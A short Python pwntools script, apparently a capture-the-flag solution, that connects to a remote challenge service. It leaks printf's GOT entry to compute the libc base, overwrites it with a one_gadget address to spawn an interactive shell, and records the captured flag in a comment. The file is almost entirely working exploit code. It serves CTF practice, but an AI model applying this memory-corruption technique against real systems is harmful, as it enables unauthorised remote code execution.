#!/usr/bin/env python
from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('35.194.194.168', 6666)
libc = ELF('libc.so')

printf_got= 0x600bb8

r.sendlineafter('Where u want to write :', str(printf_got))

r.recvuntil('Value of {}='.format(hex(printf_got)))
libc_base = int(r.recvline()[:-1], 16) - libc.symbols['printf']
log.success('libc base: ' + hex(libc_base))
one_gadget = libc_base + 0x45216 # constraint: rax == NULL

r.sendlineafter('What value u want to write :', str(one_gadget))

r.interactive()

# FLAG{y33SuTd5GsmOPwonYWqePbS3y3R9Tz33}
